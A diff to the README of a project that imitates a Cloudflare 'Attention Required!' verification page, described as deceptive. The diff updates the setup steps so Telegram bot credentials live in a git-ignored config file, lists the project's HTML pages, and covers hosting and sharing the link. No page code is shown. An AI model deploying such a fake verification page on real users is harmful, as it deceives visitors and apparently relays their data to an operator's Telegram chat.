@@ -30,19 +30,30 @@ This project mimics a Cloudflare-style "Attention Required!" page with a decepti
 
 ## 🔧 Setup Instructions
 
-1. **Clone or copy the HTML file.**
+1. **Clone or copy the project files.**
 
-2. **Replace the Telegram credentials:**
+2. **Create your configuration file:**
 
-   Open the `<script>` section in the HTML and update these two lines:
+   Copy the example config and fill in your Telegram credentials:
+
+   ```bash
+   cp config.example.js config.js
+   ```
+
+   Then edit `config.js` and replace the placeholder values:
 
    ```js
-   const TELEGRAM_BOT_TOKEN = "770000000000:DFHBCGHMHGMHFGHSDKUJHSU8I"; // Replace with your bot token
-   const TELEGRAM_CHAT_ID = "000000000"; // Replace with your Telegram chat ID
-   ````
+   const CONFIG = {
+     TELEGRAM_BOT_TOKEN: "your-actual-bot-token",
+     TELEGRAM_CHAT_ID: "your-actual-chat-id",
+   };
+   ```
 
-3. **Host the HTML file on a web server**
+   > ⚠️ **Never commit `config.js` to version control.** It is listed in `.gitignore` to prevent accidental exposure of your credentials.
+
+3. **Host the project files on a web server**
    (e.g. GitHub Pages, Vercel, Netlify, or your own server).
+   Make sure `config.js` is deployed alongside the HTML files.
 
 4. **Open the hosted URL in a browser**
    or share the link with users (only with permission).
@@ -92,7 +103,11 @@ This tool should **only be used**:
 ## 📂 Project Structure
 
 ```
-index.html          # Main HTML file with embedded JavaScript and CSS
+verify.html          # Simple verification page
+needsmoreperm.html   # Advanced Cloudflare-style verification page
+config.example.js    # Template for Telegram credentials
+config.js            # Your actual credentials (git-ignored)
+.gitignore           # Excludes config.js from version control
 ```
 
 ---
